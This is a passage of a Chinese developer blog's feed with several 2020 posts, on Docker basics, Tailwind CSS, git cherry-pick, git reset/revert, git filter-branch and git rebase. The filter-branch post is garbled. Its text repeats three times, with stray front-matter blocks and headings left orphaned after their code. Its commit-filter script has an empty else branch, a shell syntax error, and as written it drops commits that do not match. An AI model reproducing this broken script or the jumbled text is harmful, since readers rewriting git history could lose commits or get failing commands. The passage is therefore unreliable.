class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token punctuation">}</span>      <span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>dispatch 相对 commit 就要复杂的多了。</p><h2 id="插件体系"><a href="#插件体系" class="headerlink" title="插件体系"></a>插件体系</h2>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker 简易入门</title>
      <link href="/2020/12/17/ops/easy-docker/"/>
      <url>/2020/12/17/ops/easy-docker/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/20180125141147_61638d31e51d85f2a5d62e04191fe55f_1.jpg" alt="齐天大圣孙悟空"></p><blockquote><p>拔一根毫毛，吹出猴万个。他叫孙悟空，也叫 docker。</p></blockquote><h2 id="docker-无所不能？"><a href="#docker-无所不能？" class="headerlink" title="docker 无所不能？"></a>docker 无所不能？</h2><ol><li>安装 wordpress</li></ol><pre class=" language-shell"><code class="language-shell">docker run --name wordpress -p 8080:80 -d wordpress</code></pre><ol start="2"><li>安装 Nextcloud 网盘</li></ol><pre class=" language-shell"><code class="language-shell">docker run -d -p 8080:80 nextcloud</code></pre><p>wordpress 安装中，我们只看到安装界面，数据库需要选择本地或者远程。Nextcloud 网盘安装中，我们安装完成就可以直接使用，因为 Nextcloud 内部默认携带了 SQLite 数据库，所以安装之后，就能够直接使用。</p><h2 id="docker-基本概念"><a href="#docker-基本概念" class="headerlink" title="docker 基本概念"></a>docker 基本概念</h2><p><strong>镜像（Image）</strong>：Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p><p><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的 类 和 实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p><strong>仓库（eg:dockerHub）</strong>：一个 Docker Registry 中可以包含多个 仓库（Repository）；每个仓库可以包含多个 标签（Tag）；每个标签对应一个镜像。</p><h2 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h2><p>显示可用容器：</p><pre class=" language-shell"><code class="language-shell">docker images</code></pre><p>删除指定容器：</p><pre class=" language-shell"><code class="language-shell">docker rmi <镜像ID></code></pre><p>查看容器：</p><pre class=" language-shell"><code class="language-shell">docker ps</code></pre><p>拉取并运行容器：</p><pre class=" language-shell"><code class="language-shell">docker run hello-world</code></pre><p>进入容器内部，并运行 bash：</p><pre class=" language-shell"><code class="language-shell">docker exec -it <id/container_name>  /bin/bash</code></pre><h2 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h2><p>Dockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。<br>有时候一个镜像需要很多命令，这时候可以写到 Dockerfile 文件中，一次性执行完毕。<br>我们尝试将<a href="https://github.com/Yaob1990/OMRON_Blood_Pressure_Analyse" target="_blank" rel="noopener">欧姆龙血压计</a>解析工具源码编译成一个 docker 镜像</p><ol><li><p>在项目根目录新建 Dockerfile 文件，并写上以下内容。</p><pre class=" language-shell"><code class="language-shell">FROM node:14.15.1-slimRUN yarn global add http-serverCOPY dist publicEXPOSE 4000CMD ["http-server","-p","4000"]</code></pre></li><li><p>编译项目：<code>npm run build</code></p></li><li><p>打包项目：</p><pre class=" language-shell"><code class="language-shell">docker build -t yekongbuye/omron .</code></pre></li><li><p>推送到 docker hub</p><pre class=" language-shell"><code class="language-shell">docker logindocker push yekongbuye/omron</code></pre></li></ol><h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>主要是对容器进行编排。一次性编排，运行多个容器。</p><ol><li><p>创建 docker-compose.yml 文件</p><pre class=" language-yml"><code class="language-yml">version: '3.3'services:  db:    image: mysql:5.7    volumes:      - db_data:/var/lib/mysql    restart: always    environment:      MYSQL_ROOT_PASSWORD: somewordpress      MYSQL_DATABASE: wordpress      MYSQL_USER: wordpress      MYSQL_PASSWORD: wordpress  wordpress:    depends_on:      - db    image: wordpress:latest    ports:      - '8000:80'    restart: always    environment:      WORDPRESS_DB_HOST: db:3306      WORDPRESS_DB_USER: wordpress      WORDPRESS_DB_PASSWORD: wordpress      WORDPRESS_DB_NAME: wordpressvolumes:  db_data: {}</code></pre></li></ol><h2 id="分布式部署"><a href="#分布式部署" class="headerlink" title="分布式部署"></a>分布式部署</h2><ul><li>swarm</li><li>kubernetes（k8s）</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 Tailwind 看 css 中的原子化流变</title>
      <link href="/2020/12/14/front-end/atomic-in-tailwindcss/"/>
      <url>/2020/12/14/front-end/atomic-in-tailwindcss/</url>
      
        <content type="html"><![CDATA[<blockquote><p>回不到的过去，忘不掉的人。某个路口，转角再次遇见，她还是她吗，你还是你吗？</p></blockquote><h2 id="禅意花园"><a href="#禅意花园" class="headerlink" title="禅意花园"></a>禅意花园</h2><p><a href="http://www.csszengarden.com/tr/zh-cn/" target="_blank" rel="noopener">禅意花园</a>，做前端的人或多或少都听说过项目。一样的 HTML 结构，用不同的 css 去装饰，形成截然不同的页面风格，探索 css 之美。<br><code>html css</code> 这一对欢喜冤家，谁是主，谁是客，一直没有定论。</p><h2 id="关注点即世界"><a href="#关注点即世界" class="headerlink" title="关注点即世界"></a>关注点即世界</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>btn btn-primary<span class="token punctuation">'</span></span><span class="token punctuation">></span></span> // css 依附于 html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>w50 h50 black mt30<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>   // css 原子化</code></pre><h3 id="html-friendly"><a href="#html-friendly" class="headerlink" title="html-friendly"></a>html-friendly</h3><p>第一行，使用<code>class</code>修饰<code>html</code>，也就是html-friendly，样式服务于结构。<code>class</code>每一个是有多个<code>css</code>属性，这时候的代码也更接近于日常工作中的代码，但是这样的代码如果调整起来，我们经常是直接在现有的<code>class</code>上面修改，代码会越来越长，重复的逻辑也越来越多，如果项目一直在维护，那么css基本上会一直增大。毕竟，绝大多数时候，我们只在意功能的实现。</p><h3 id="css-friendly"><a href="#css-friendly" class="headerlink" title="css-friendly"></a>css-friendly</h3><p>第二行代码,是上古时期 css 原子化的代表，推崇样式的复用。<code>width:50px;height:50px;color:balck;margin-top:30px</code>。每一个<code>class</code>都代表着一种 css 属性。原子化最早是雅虎提出来的，代表作是ACSS。ACSS 表示的是原子化 CSS（Atomic CSS），是 Yahoo 提出来的一种独特的 CSS 代码组织方式，应用在 Yahoo 首页和其他产品中。ACSS 的独特性在于它的理念与一般开发人员的理解有很大的不同，并挑战了传统意义上编写 CSS 的最佳实践，也就是关注点分离原则。ACSS 认为关注点分离原则会导致冗余、繁琐和难以维护的 CSS 代码。</p><p>ACSS 的原则是把 CSS 样式打散成尽可能小的部分，每个 CSS 类只对应一条样式规则，从而达到最大化的可复用性。比如 CSS 类 M(10px)所对应的样式规则是 margin: 10px。</p><p>岁月的洗礼，原子化，似乎已经进入了历史的垃圾堆，不管是工作中还是开源框架里，很少能看到大规模使用原子化的项目（ACSS github 1.1k start），直到 tailwind 的诞生。</p><h2 id="要有光"><a href="#要有光" class="headerlink" title="要有光"></a>要有光</h2><p>原子化虽然用的很少了，但是他的影子一直都在，项目里面<code>pl10 mt5</code>这种魔法写法一直都在。<br>现代化的前端开发，追求自适应，语义化，这些都不是传统原子化能够承担的。<br><a href="https://tailwindcss.com/" target="_blank" rel="noopener">tailwindcss</a>，应运而生，扛起了 css 原子化的大旗。<br>主要优点：</p><ul><li>着眼于现代化前端，默认单位是 <code>rem</code> 而不是 <code>px</code></li><li>丰富的预设，预设字体大小，丰富的颜色</li><li>响应式设计，提供一系列断点判断</li><li>方便扩展，根据你的项目需要，自定义相关的原子类</li><li>兼容各大框架，并有详细说明</li></ul><h2 id="是骡子是马"><a href="#是骡子是马" class="headerlink" title="是骡子是马"></a>是骡子是马</h2><p><a href="https://github.com/Yaob1990/OMRON_Blood_Pressure_Analyse" target="_blank" rel="noopener">欧姆龙血压计数据分析</a>，使用了<code>tailwindcss</code>作为基础。<br><img src="/images/16079566659385.jpg" alt="pc"></p><p><img src="/images/16079566841086.jpg" alt="mobile"></p><p>头部的响应式效果，下面是这部分代码：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>relative h-96<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w-full h-96 object-cover absolute<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../assets/bg.jpg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w-full h-96 bg-black absolute opacity-40<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>      <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>w-full h-96 absolute flex flex-col  justify-center items-center<span class="token punctuation">"</span></span>    <span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>font text-white text-center text-4xl  font-bold<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        欧姆龙血压计数据(CSV)解析工具      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-8<span class="token punctuation">"</span></span> <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>开始解析数据<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><p>瞥一眼<code>w-full h-96 absolute flex flex-col justify-center items-center</code> 这一大堆都是什么鬼东西…</p><pre class=" language-css"><code class="language-css"><span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">96</span>rem<span class="token punctuation">;</span><span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span><span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span><span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span><span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span><span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span></code></pre><p>如果你觉得这样写还是有点难看，可以这样写：</p><pre><code>&lt;div class=&#39;wrapper&#39;&gt;.wrapper{    @apply w-full h-96 absolute flex flex-col justify-center items-center}</code></pre><p>是不是感觉好那么一点点…几个class，完成了响应式布局，感觉还是很不错的，而且不用想一堆 class 命名。</p><h2 id="真的那么好？"><a href="#真的那么好？" class="headerlink" title="真的那么好？"></a>真的那么好？</h2><p>初见总是美好的，相处总是困难的。</p><ul><li>写px单位，要么换算成 rem，要么自定义属性</li><li>需要新学一堆 class 语法</li><li>要思考，对公共类进行抽象，定义，不能无脑写</li><li>对 css 技能要求高，在 一堆的原子中，写一个用不到，或者不生效的 class 是不能被容忍的</li><li>项目维护是个灾难，如果接手的人不熟悉这套模式，他会想你个傻x…</li></ul><p>个人项目，天马行空，我的地盘我做主，Tailwind 用起来，小巧可人，甜而不腻。<br>公司项目，代码冗余并不是不能接收的事情，考虑到项目维护，暂不推荐。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>弱水三千，只取一瓢 —— git cherry-pick</title>
      <link href="/2020/12/03/tool/git-cherry-pick/"/>
      <url>/2020/12/03/tool/git-cherry-pick/</url>
      
        <content type="html"><![CDATA[<h3 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h3><p>双主线的模式 AB，独自演进，存在一个共同的 bug，在 dev 上面修改好 bug 之后，需要合并到 AB 中，并且 A、B、dev 是一直在演进的，不能直接合并入 AB。</p><h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><pre class=" language-shell"><code class="language-shell">git checkout A // 切换到 A 分支git cherry-pick C1 // 拣选 C1 并合并到 A 分支git checkout B  // 切换到 B 分支git cherry-pick C1  // 拣选 C1 并合并到 B 分支</code></pre><p><code>cherry-pick</code> 捡樱桃，这名字很可爱：）。commit 就像一地的樱桃，我们需要做的就是去捡起大大小小的樱桃。</p><pre><code>$ git cherry-pick &lt;commitHash&gt;</code></pre><p>获得需要合并的 commit 值，切换到待合并的分支，执行 <code>cherry-pick</code>，</p><h3 id="详细参数"><a href="#详细参数" class="headerlink" title="详细参数"></a>详细参数</h3><pre><code>--quit                      终止反转或拣选操作--continue                  继续反转或拣选操作--abort                     取消反转或拣选操作--skip                      跳过当前提交并继续--cleanup &lt;模式&gt;             设置如何删除提交说明里的空格和#注释-n, --no-commit             不要自动提交-e, --edit                  编辑提交说明-s, --signoff               添加 Signed-off-by: 签名-m, --mainline              &lt;父编号&gt;选择主干父提交编号--rerere-autoupdate         如果可能，重用冲突解决更新索引--strategy                  &lt;策略&gt; 合并策略-X, --strategy-option       &lt;选项&gt; 合并策略的选项-S, --gpg-sign[=&lt;key-id&gt;]   GPG 提交签名-x                          追加提交名称--ff                        允许快进式--allow-empty               保留初始化的空提交--allow-empty-message       允许提交说明为空--keep-redundant-commits    保持多余的、空的提交</code></pre><h3 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h3><p>红尘过往，弱水三千，只取一瓢。<br>git 的 <code>cherry-pick</code> 是简单明确的，不会出错。而你我的生活，从没有平行宇宙，这一瓢水又从何而取…</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回到过去的一万种方式 —— git 时光机</title>
      <link href="/2020/12/02/tool/git-timemachine/"/>
      <url>/2020/12/02/tool/git-timemachine/</url>
      
        <content type="html"><![CDATA[<blockquote><p>时光无法倒流，git 却让我们有机会修改历史</p></blockquote><p>查看修改历史，代码回退是开发中经常用到的命令，但是很多时候，我们并不是非常明确其中的区别。这篇博客尝试说清楚其中的区别。</p><h3 id="git-checkout"><a href="#git-checkout" class="headerlink" title="git checkout"></a>git checkout</h3><pre class=" language-shell"><code class="language-shell">git checkout hotfix // 切换分支git checkout abbcde // 切换 commit</code></pre><p><code>checkout</code> 能够返回 commit ，用于查看 commit ，但是并不能修改或者回退 commit。</p><h3 id="git-revert"><a href="#git-revert" class="headerlink" title="git revert"></a>git revert</h3><pre class=" language-shell"><code class="language-shell">git revert HEAD^ // 回退到上一次的提交</code></pre><p><code>revert</code> 的回退严格来说并不是回退，他是用之前的 commit ，复制一遍，产生新的 commit ，实现的代码回退。</p><h3 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h3><pre class=" language-shell"><code class="language-shell">git reset c1 // 回退commit,保留源码到工作区git reset --soft c1 // 回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可；git reset --mixed c1 // 回退到某个版本，回退文件保存在工作区中，并且是 unstaged 状态，如果需要提交，需要 staged，之后再commitgit reset --hard c1 // 彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉；</code></pre><h3 id="一万种方式？？"><a href="#一万种方式？？" class="headerlink" title="一万种方式？？"></a>一万种方式？？</h3><p>一生二二生三三生万物，施主，不要有执念。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>忘记该忘记的，记住该记住的 —— git filter-branch</title>
      <link href="/2020/12/01/tool/filter-branch/"/>
      <url>/2020/12/01/tool/filter-branch/</url>
      
        <content type="html"><![CDATA[<p>Pro git 中把 <code>filter-branch</code> 称为 <strong>核弹</strong>，让人难以忘记，也充分说明了该命令的威力。</p><h3 id="问题场景"><a href="#问题场景" class="headerlink" title="问题场景"></a>问题场景</h3><ol><li>在你的开源仓库中提交了，一个数据库的配置文件。</li><li>同事在仓库中把 <code>node_modules</code>目录提交到仓库中，并且这个目录还被后续更新过。</li></ol><h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>可以使用<code>filter-branch</code>实现上述需求。</p><p>从每一个提交移除一个文件：</p><pre class=" language-shell"><code class="language-shell">git filter-branch --tree-filter 'rm -f passwords.txt' HEAD</code></pre><p>从每一个提交移除一个目录：</p><pre class=" language-shell"><code class="language-shell">git filter-branch --tree-filter 'rm -rf node_modules' HEAD</code></pre><p>限制移除范围：</p><pre class=" language-shell"><code class="language-shell">git filter-branch --tree-filter 'rm -rf node_modules' HEAD~30..HEAD</code></pre><p>全局修改邮箱地址：</p><pre class=" language-shell"><code class="language-shell">git filter-branch --commit-filter '    if [ "$GIT_AUTHOR_EMAIL" = "schacon@localhost" ];    then      GIT_AUTHOR_NAME="Scott Chacon";      GIT_AUTHOR_EMAIL="schacon@example.com";      git commit-tree "$@";        else        fi' HEAD</code></pre><h3 id="详细参数："><a href="#详细参数：" class="headerlink" title="详细参数："></a>详细参数：</h3><ul><li><p><code>--tree-filter </code>表示修改文件列表</p></li><li><p><code>--msg-filter </code>表示修改提交信息，原提交信息从标准输入读入，新提交信息输出到标准输出</p></li><li><p><code>--commit-filter</code> 针对提交信息进行修改</p></li><li><p><code>--prune-empty </code>表示如果修改后的提交为空则扔掉不要。</p></li><li><p><code>-f</code>是忽略备份。不加这个选项第二次运行这个命令时会出错，意思是 git 上次做了备份，现在再要运行的话得处理掉上次的备份。</p></li><li><p><code>--all</code>是针对所有的分支。</p></li></ul><pre><code>  [^依云：初次使用 git 的“核弹级选项”：filter-branch]: https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html</code></pre><pre><code>title: 忘记该忘记的，记住该记住的 —— git filter-branchdate: 2020-12-01 22:00:00categories: 工具tags: gitimg: ../../coverImages/git.jpgtypora-root-url: ../../images</code></pre><p>Pro git 中把 <code>filter-branch</code> 称为 <strong>核弹</strong>，让人难以忘记，也充分说明了该命令的威力。</p><h3 id="问题场景-1"><a href="#问题场景-1" class="headerlink" title="问题场景"></a>问题场景</h3><ol><li>在你的开源仓库中提交了，一个数据库的配置文件。</li><li>同事在仓库中把 <code>node_modules</code>目录提交到仓库中，并且这个目录还被后续更新过。</li></ol><h3 id="解决方案：-1"><a href="#解决方案：-1" class="headerlink" title="解决方案："></a>解决方案：</h3><p>可以使用<code>filter-branch</code>实现上述需求。</p><p>从每一个提交移除一个文件：</p><pre><code>git filter-branch --tree-filter &#39;rm -f passwords.txt&#39; HEADgit filter-branch --tree-filter &#39;rm -rf node_modules&#39; HEADgit filter-branch --tree-filter &#39;rm -rf node_modules&#39; HEAD~30..HEADgit filter-branch --commit-filter &#39;    if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;schacon@localhost&quot; ];    then      GIT_AUTHOR_NAME=&quot;Scott Chacon&quot;;      GIT_AUTHOR_EMAIL=&quot;schacon@example.com&quot;;      git commit-tree &quot;$@&quot;;    else    fi&#39; HEAD</code></pre><ul><li><p><code>--tree-filter</code>表示修改文件列表</p></li><li><p><code>--msg-filter</code>表示修改提交信息，原提交信息从标准输入读入，新提交信息输出到标准输出</p></li><li><p><code>--commit-filter</code> 针对提交信息进行修改</p></li><li><p><code>--prune-empty</code>表示如果修改后的提交为空则扔掉不要。</p></li><li><p><code>-f</code>是忽略备份。不加这个选项第二次运行这个命令时会出错，意思是 git 上次做了备份，现在再要运行的话得处理掉上次的备份。</p></li><li><p><code>--all</code>是针对所有的分支。</p><p>[[<strong><a href="https://git-scm.com/docs/git-filter-branch" target="_blank" rel="noopener">https://git-scm.com/docs/git-filter-branch</a></strong>] ] 官方文档</p><p>[[<strong>依云：初次使用 git 的“核弹级选项”：filter-branch</strong>] ] <a href="https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html" target="_blank" rel="noopener">https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html</a></p></li></ul><h3 id="详细参数：-1"><a href="#详细参数：-1" class="headerlink" title="详细参数："></a>详细参数：</h3><p>全局修改邮箱地址：</p><p>限制移除范围：</p><p>从每一个提交移除一个目录：</p><pre><code>title: 忘记该忘记的，记住该记住的 —— git filter-branchdate: 2020-12-01 22:00:00categories: 工具tags: gitimg: ../../coverImages/git.jpgtypora-root-url: ../../images</code></pre><p>Pro git 中把 <code>filter-branch</code> 称为 <strong>核弹</strong>，让人难以忘记，也充分说明了该命令的威力。</p><h3 id="问题场景-2"><a href="#问题场景-2" class="headerlink" title="问题场景"></a>问题场景</h3><ol><li>在你的开源仓库中提交了，一个数据库的配置文件。</li><li>同事在仓库中把 <code>node_modules</code>目录提交到仓库中，并且这个目录还被后续更新过。</li></ol><h3 id="解决方案：-2"><a href="#解决方案：-2" class="headerlink" title="解决方案："></a>解决方案：</h3><p>可以使用<code>filter-branch</code>实现上述需求。</p><p>从每一个提交移除一个文件：</p><pre><code>git filter-branch --tree-filter &#39;rm -f passwords.txt&#39; HEADgit filter-branch --tree-filter &#39;rm -rf node_modules&#39; HEADgit filter-branch --tree-filter &#39;rm -rf node_modules&#39; HEAD~30..HEADgit filter-branch --commit-filter &#39;    if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;schacon@localhost&quot; ];    then      GIT_AUTHOR_NAME=&quot;Scott Chacon&quot;;      GIT_AUTHOR_EMAIL=&quot;schacon@example.com&quot;;      git commit-tree &quot;$@&quot;;    else    fi&#39; HEAD</code></pre><ul><li><p><code>--tree-filter</code>表示修改文件列表</p></li><li><p><code>--msg-filter</code>表示修改提交信息，原提交信息从标准输入读入，新提交信息输出到标准输出</p></li><li><p><code>--commit-filter</code> 针对提交信息进行修改</p></li><li><p><code>--prune-empty</code>表示如果修改后的提交为空则扔掉不要。</p></li><li><p><code>-f</code>是忽略备份。不加这个选项第二次运行这个命令时会出错，意思是 git 上次做了备份，现在再要运行的话得处理掉上次的备份。</p></li><li><p><code>--all</code>是针对所有的分支。</p><p>[[<strong><a href="https://git-scm.com/docs/git-filter-branch" target="_blank" rel="noopener">https://git-scm.com/docs/git-filter-branch</a></strong>] ] 官方文档</p><p>[[<strong>依云：初次使用 git 的“核弹级选项”：filter-branch</strong>] ] <a href="https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html" target="_blank" rel="noopener">https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html</a></p></li></ul><h3 id="详细参数：-2"><a href="#详细参数：-2" class="headerlink" title="详细参数："></a>详细参数：</h3><p>全局修改邮箱地址：</p><p>限制移除范围：</p><p>从每一个提交移除一个目录：</p><pre><code>title: 忘记该忘记的，记住该记住的 —— git filter-branchdate: 2020-12-01 22:00:00categories: 工具tags: gitimg: ../../coverImages/git.jpgtypora-root-url: ../../images</code></pre><p>Pro git 中把 <code>filter-branch</code> 称为 <strong>核弹</strong>，让人难以忘记，也充分说明了该命令的威力。</p><h3 id="问题场景-3"><a href="#问题场景-3" class="headerlink" title="问题场景"></a>问题场景</h3><ol><li>在你的开源仓库中提交了，一个数据库的配置文件。</li><li>同事在仓库中把 <code>node_modules</code>目录提交到仓库中，并且这个目录还被后续更新过。</li></ol><h3 id="解决方案：-3"><a href="#解决方案：-3" class="headerlink" title="解决方案："></a>解决方案：</h3><p>可以使用<code>filter-branch</code>实现上述需求。</p><p>从每一个提交移除一个文件：</p><pre><code>git filter-branch --tree-filter &#39;rm -f passwords.txt&#39; HEADgit filter-branch --tree-filter &#39;rm -rf node_modules&#39; HEADgit filter-branch --tree-filter &#39;rm -rf node_modules&#39; HEAD~30..HEADgit filter-branch --commit-filter &#39;    if [ &quot;$GIT_AUTHOR_EMAIL&quot; = &quot;schacon@localhost&quot; ];    then      GIT_AUTHOR_NAME=&quot;Scott Chacon&quot;;      GIT_AUTHOR_EMAIL=&quot;schacon@example.com&quot;;      git commit-tree &quot;$@&quot;;    else    fi&#39; HEAD</code></pre><ul><li><p><code>--tree-filter</code>表示修改文件列表</p></li><li><p><code>--msg-filter</code>表示修改提交信息，原提交信息从标准输入读入，新提交信息输出到标准输出</p></li><li><p><code>--commit-filter</code> 针对提交信息进行修改</p></li><li><p><code>--prune-empty</code>表示如果修改后的提交为空则扔掉不要。</p></li><li><p><code>-f</code>是忽略备份。不加这个选项第二次运行这个命令时会出错，意思是 git 上次做了备份，现在再要运行的话得处理掉上次的备份。</p></li><li><p><code>--all</code>是针对所有的分支。</p><p>[[[<strong><a href="https://git-scm.com/docs/git-filter-branch" target="_blank" rel="noopener">https://git-scm.com/docs/git-filter-branch</a></strong>] ] ] 官方文档</p><p>[[[<strong>依云：初次使用 git 的“核弹级选项”：filter-branch</strong>] ] ] <a href="https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html" target="_blank" rel="noopener">https://blog.lilydjwg.me/2011/4/22/tried-the-nuclear-option-filter-branch-of-git-the-first-time.26331.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重置过去，面向未来 —— git rebase</title>
      <link href="/2020/11/30/tool/git-rebase/"/>
      <url>/2020/11/30/tool/git-rebase/</url>
      
        <content type="html"><![CDATA[<blockquote><p>git rebase 是一个危险的操作，如果不能熟练掌握，请不要使用它。（它并不是不可或缺的）</p></blockquote><p><code>git rebase</code> 是一个平常使用较少的一个命令，这次准备分享 git ，把一系列不常用的 git 命令，都熟悉一下。简单明了，不深究原理，只面向解决问题。</p><h3 id="场景一：合并多次提交"><a href="#场景一：合并多次提交" class="headerlink" title="场景一：合并多次提交"></a>场景一：合并多次提交</h3><p>本地开发，存在多次提交记录，需要合并提交，方便查看。</p><pre class=" language-shell"><code class="language-shell">commit 36bf7ff90f1cf33991cc68dac8e078c3f6e14ca3 (HEAD -> master)Date:   Mon Nov 30 21:17:25 2020 +0800    add 2.txtcommit 1569f1e8dfa9bca26e0233780a43e0961209ad8cDate:   Mon Nov 30 21:17:12 2020 +0800    add 1.txt</code></pre><ol><li><p>列出本地最近记录</p><pre class=" language-shell"><code class="language-shell">git rebase -i HEAD~2</code></pre></li><li><p>这时候会进入 <code>vi</code>模式</p><pre class=" language-shell"><code class="language-shell">pick 60b798f add a bpick d39bbcd add 1.txt add 2.txt# 变基 8a749eb..d39bbcd 到 8a749eb（2 个提交）## 命令:# p, pick <提交> = 使用提交# r, reword <提交> = 使用提交，但修改提交说明# e, edit <提交> = 使用提交，进入 shell 以便进行提交修补# s, squash <提交> = 使用提交，但融合到前一个提交# f, fixup <提交> = 类似于 "squash"，但丢弃提交说明日志# x, exec <命令> = 使用 shell 运行命令（此行剩余部分）# b, break = 在此处停止（使用 'git rebase --continue' 继续变基）# d, drop <提交> = 删除提交# l, label <label> = 为当前 HEAD 打上标记# t, reset <label> = 重置 HEAD 到该标记# m, merge [-C <commit> | -c <commit>] <label> [# <oneline>]# .       创建一个合并提交，并使用原始的合并提交说明（如果没有指定# .       原始提交，使用注释部分的 oneline 作为提交说明）。使用# .       -c <提交> 可以编辑提交说明。## 可以对这些行重新排序，将从上至下执行。</code></pre><p>vi 模式修改 <code>pick</code> 保存之后，就可以实现合并提交记录。</p><p><strong>注意：</strong>第一行<code>pick 60b798f add a 